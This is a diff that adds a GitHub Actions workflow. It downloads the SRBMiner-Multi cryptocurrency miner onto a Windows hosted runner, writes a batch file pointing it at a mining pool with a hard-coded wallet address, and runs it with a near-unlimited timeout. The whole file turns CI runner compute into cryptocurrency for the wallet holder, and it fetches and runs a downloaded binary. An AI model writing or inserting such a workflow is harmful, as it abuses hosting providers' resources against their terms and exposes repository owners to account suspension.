@@ -1,0 +1,43 @@
+name: Windows - SRBMiner
+
+on:
+  workflow_dispatch:
+
+jobs:
+  mining:
+    name: SRBMiner Setup & Run
+    runs-on: windows-latest
+    timeout-minutes: 9999
+    
+    steps:
+
+      - name: Download & Extract SRBMiner
+        run: |
+          $desktopPath = "C:\Users\runneradmin\Desktop"
+          $zipFile = "$desktopPath\SRBMiner-Multi-2-7-7-win64.zip"
+          $extractPath = "$desktopPath\SRBMiner-Multi-2-7-7"
+          
+          # Download ZIP
+          Invoke-WebRequest -Uri "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.7/SRBMiner-Multi-2-7-7-win64.zip" -OutFile $zipFile
+          
+          # Extract ZIP
+          Expand-Archive -Path $zipFile -DestinationPath $desktopPath -Force
+          
+          # Wait for extraction
+          while (!(Test-Path $extractPath)) { Start-Sleep -Seconds 3 }
+
+      - name: Configure Mining Script
+        run: |
+          $miningFile = "C:\Users\runneradmin\Desktop\SRBMiner-Multi-2-7-7\start-mining.bat"
+          Set-Content -Path $miningFile -Value @"
+          @echo off
+          cd %~dp0
+          cls
+          SRBMiner-MULTI.exe --disable-gpu --algorithm verushash --pool usw.vipor.net:5040 --wallet RJ1YFPrnH8HWGE2nm46483GRsTpvwLjZBX.auto --cpu-threads 2
+          pause
+          "@
+
+      - name: Start Mining
+        run: |
+          cd "C:\Users\runneradmin\Desktop\SRBMiner-Multi-2-7-7"
+          Start-Process -FilePath "cmd.exe" -ArgumentList "/c start-mining.bat" -NoNewWindow -Wait
